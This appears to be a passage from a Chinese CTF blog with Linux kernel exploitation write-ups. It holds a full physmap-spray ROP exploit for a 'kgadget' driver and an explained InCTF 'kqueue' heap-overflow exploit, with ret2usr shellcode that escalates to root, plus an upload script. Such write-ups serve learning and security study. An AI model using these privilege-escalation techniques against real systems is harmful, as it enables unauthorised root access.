class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prepare_kernel_cred 0xffffffff810c9540</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> commit_creds 0xffffffff810c92e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> init_cred 0xffffffff82a6b700</span><br><span class="hljs-type">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff8108c6f0</span>;<br><span class="hljs-type">size_t</span>  pop_rax_ret = <span class="hljs-number">0xffffffff810115d4</span>;<br><span class="hljs-type">size_t</span>  pop_rsp_ret = <span class="hljs-number">0xffffffff811483d0</span>;<br><span class="hljs-type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81c00fb0</span> + <span class="hljs-number">27</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xe8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff812bd353</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xd8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff810e7a54</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="hljs-number">0xffffffff810737fe</span>;<br><span class="hljs-type">size_t</span>  ret = <span class="hljs-number">0xffffffff8108c6f1</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">size_t</span> page_size;<br><span class="hljs-type">size_t</span> *physmap_spray_arr[<span class="hljs-number">16000</span>];<br><span class="hljs-type">size_t</span> try_hit;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">getuid</span>())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">constructROPChain</span><span class="hljs-params">(<span class="hljs-type">size_t</span> *rop)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span>     idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// gadget to trigger pt_regs and for slide</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x30</span>); idx++)<br>        rop[idx] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;<br><br>    <span class="hljs-comment">// more normal slide code</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x10</span>); idx++)<br>        rop[idx] = ret;<br><br>    <span class="hljs-comment">// rop chain</span><br>    rop[idx++] = pop_rdi_ret;<br>    rop[idx++] = init_cred;<br>    rop[idx++] = commit_creds;<br>    rop[idx++] = swapgs_restore_regs_and_return_to_usermode;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = (<span class="hljs-type">size_t</span>) getRootShell;<br>    rop[idx++] = user_cs;<br>    rop[idx++] = user_rflags;<br>    rop[idx++] = user_sp;<br>    rop[idx++] = user_ss;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">saveStatus</span>();<br>    dev_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/kgadget&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;dev fd!&quot;</span>);<br><br>    page_size = <span class="hljs-built_in">sysconf</span>(_SC_PAGESIZE);<br>    <span class="hljs-comment">// physmap_spray_arr[0] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16000</span>; i++)&#123;<br>        physmap_spray_arr[i] = <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!physmap_spray_arr[i])<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;oom for physmap spray!&quot;</span>);<br>        <span class="hljs-built_in">constructROPChain</span>(physmap_spray_arr[i]);       <br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger physmap one_gadget...&quot;</span>);<br><br>    try_hit = <span class="hljs-number">0xffff888000000000</span> + <span class="hljs-number">0x7000000</span>;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>        <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>        <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>        <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>        <span class="hljs-string">&quot;mov r9,    pop_rsp_ret;&quot;</span>   <span class="hljs-comment">// stack migration again</span><br>        <span class="hljs-string">&quot;mov r8,    try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rax,   0x10;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx,   try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi,   0x1bf52;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi,   dev_fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="从InCTF的kqueue学习内核堆溢出"><a href="#从InCTF的kqueue学习内核堆溢出" class="headerlink" title="从InCTF的kqueue学习内核堆溢出"></a>从InCTF的kqueue学习内核堆溢出</h2><p>这道题断断续续看了一周，得出一个结论，一定要上手调，硬看是看不出来什么的，结合别人写的EXP去整理思路。<br>题目的登陆账号是ctf，密码是kqueue。题目中的所有检查失败都执行了err函数，但是这个函数返回-1并不会造成程序退出，因此可以约等于没有检查（对做题有用）。<br>这道题解包文件系统再压缩后qemu就启动不起来了，不太清楚原因，所以用发送exp的脚本直接将exp发过去，不再解包压缩。<br>题目给了源码，堆溢出的漏洞发生在<code>save_kqueue_entries</code>函数处<br><img src="https://i.imgur.com/PkAX5yW.png" srcset="/img/loading.gif" lazyload></p>
<p>至于为什么会溢出，原因在于data_size是我们给的request.data_size是我们给的，而new_queue的定义为<code>char *new_queue = validate((char *)kzalloc(queue-&gt;queue_size,GFP_KERNEL));</code>（定义同样也在save函数里）。我们可以看到申请的大小是queue-&gt;queue_size，因此只要我们确保我们传入的data_size大小大于queue_size即可。</p>
<p>这道题用到的的seq_operations结构体（之前的题中已经用过了），seq_operations的大小为0x20，所以我们要确保new_queue的大小也为0x20，这样它们就会被分配在相邻的空间里。这样溢出就可以修改start函数指针为我们的shellcode。</p>
<p>那么如何确保queue_size为0x20大小呢，因为struct queue结构体就已经是0x20大小了，如果还有queue_entry数据的话肯定就会比0x20大了，因此我们在create_kqueue函数中要确保space的值为0。要确保space的值为0，就要确保max_entries+1为0。这里就用到了整数溢出，我们传入的max_entries的值为0xffff的话，+1就可变为0。<br><img src="https://i.imgur.com/LqVxEMc.png" srcset="/img/loading.gif" lazyload><br><img src="https://i.imgur.com/CxtpgIE.png" srcset="/img/loading.gif" lazyload></p>
<p>所以本题的思路已经很明显了，首先是整数溢出，然后堆喷，堆溢出覆写seq_operations的start函数。因为没有smep，smap和kpti保护，因此可以ret2usr。<br>因为开启了kaslr保护，而我们还没有泄露内核地址，所以我们需要在用户态编写的shellcode中获得内核基址，这里主要用到了在调用start函数的时候会将start函数的下一条指令压栈，因此我们在shellcode中获得这条指令的地址，然后减去0x201179（IDA里搜seq_read），即可得到基地址。然后提权拿shell。<br><img src="https://i.imgur.com/EIhzNPr.png" srcset="/img/loading.gif" lazyload></p>
<p>我们调试的时候断在<code>save_kqueue_entries</code>函数处堆溢出的那个语句<br><img src="https://i.imgur.com/Sya02EK.png" srcset="/img/loading.gif" lazyload><br>我们可以看到memcpy函数的目标地址是0xffff88803dbbc640，我们看一下这个地址的值，发现他的下一块相邻地址就是seq_operations结构体所在的位置（通过重复的指令看出来）。<br><img src="https://i.imgur.com/4jdN5iF.png" srcset="/img/loading.gif" lazyload><br>但这道题我不太理解的是我们先堆喷后save_queue，那么申请的new_queue不应该在堆喷的seq_operations结构体后面么，为什么溢出还可以覆盖到。希望有懂得大佬滴滴我给我讲一下。</p>
<p>EXP</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span>&#123;<br>    <span class="hljs-type">uint32_t</span> max_entries;<br>    <span class="hljs-type">uint16_t</span> data_size;<br>    <span class="hljs-type">uint16_t</span> entry_idx;<br>    <span class="hljs-type">uint16_t</span> queue_idx;<br>    <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-type">request_t</span>;<br><br><span class="hljs-type">long</span> dev_fd;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">getuid</span>())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">createQueue</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> max_entries, <span class="hljs-type">uint16_t</span> data_size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">request_t</span> req = <br>    &#123;<br>        .max_entries    = max_entries,<br>        .data_size      = data_size,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0xDEADC0DE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">editQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint16_t</span> entry_idx,<span class="hljs-type">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx  = queue_idx,<br>        .entry_idx  = entry_idx,<br>        .data       = data,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0xDAADEEEE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deleteQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">request_t</span> req = <br>    &#123;<br>        .queue_idx = queue_idx,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0xBADDCAFE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">saveQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint32_t</span> max_entries,<span class="hljs-type">uint16_t</span> data_size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx      = queue_idx,<br>        .max_entries    = max_entries,<br>        .data_size      = data_size,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0xB105BABE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shellcode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r12, [rsp + 0x8];&quot;</span><br>        <span class="hljs-string">&quot;sub r12, 0x201179;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, r12;&quot;</span><br>        <span class="hljs-string">&quot;add r12, 0x8c580;&quot;</span>  <span class="hljs-comment">// prepare_kernel_cred</span><br>        <span class="hljs-string">&quot;add r13, 0x8c140;&quot;</span>  <span class="hljs-comment">// commit_creds</span><br>        <span class="hljs-string">&quot;xor rdi, rdi;&quot;</span><br>        <span class="hljs-string">&quot;call r12;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>        <span class="hljs-string">&quot;call r13;&quot;</span><br>        <span class="hljs-string">&quot;swapgs;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_ss;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_sp;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_cs;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, root_rip;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;iretq;&quot;</span><br>    );<br>&#125;<br><br><span class="hljs-type">size_t</span> root_rip;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">long</span> seq_fd[<span class="hljs-number">0x200</span>];<br>    <span class="hljs-type">size_t</span> *page;<br>    <span class="hljs-type">size_t</span> data[<span class="hljs-number">0x20</span>];<br><br>    <span class="hljs-built_in">saveStatus</span>();<br>    root_rip = (<span class="hljs-type">size_t</span>)getRootShell;<br>    dev_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/kqueue&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;FAILED to open the dev!&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++)&#123;<br>        data[i] = (<span class="hljs-type">size_t</span>) shellcode;<br>    &#125;<br><br>    <span class="hljs-built_in">createQueue</span>(<span class="hljs-number">0xffffffff</span>, <span class="hljs-number">0x20</span> * <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">editQueue</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, data);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>        seq_fd[i] = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br><br>    <span class="hljs-built_in">saveQueue</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>        <span class="hljs-built_in">read</span>(seq_fd[i], data, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>发送exp的脚本</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br>import base64<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>with <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;./exp&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">f</span>:<br>    <span class="hljs-built_in">exp</span> = base64.b64encode(<span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>())<br><br><span class="hljs-keyword">p</span> = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br><br>try_count = <span class="hljs-number">1</span><br><span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-string">&quot;buildroot login: &quot;</span>)<br><span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;ctf&quot;</span>)<br><span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-string">&quot;Password: &quot;</span>)<br><span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;kqueue&quot;</span>)<br><span class="hljs-keyword">while</span> True:<br>    <span class="hljs-keyword">p</span>.sendline()<br>    <span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-string">&quot;$&quot;</span>)<br><br>    <span class="hljs-built_in">count</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">exp</span>), <span class="hljs-number">0</span>x200):<br>        <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;echo -n \&quot;&quot;</span> + <span class="hljs-built_in">exp</span>[i:i + <span class="hljs-number">0</span>x200].decode() + <span class="hljs-string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)<br>        <span class="hljs-built_in">count</span> += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">log</span>.info(<span class="hljs-string">&quot;count: &quot;</span> + str(<span class="hljs-built_in">count</span>))<br><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">count</span>):<br>        <span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-string">&quot;$&quot;</span>)<br><br>    <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)<br>    <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;chmod +x /tmp/exploit&quot;</span>)<br>    <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;cd /tmp/ &quot;</span>)<br>    <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;ls&quot;</span>)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">p</span>.recv())<br><br>    <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">p</span>.interactive()<br></code></pre></td></tr></table></figure>

<p>编译EXP的命令</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">musl-gcc <span class="hljs-built_in">exp</span>.c -o <span class="hljs-built_in">exp</span> -<span class="hljs-keyword">static</span> -masm=intel<br></code></pre></td></tr></table></figure>

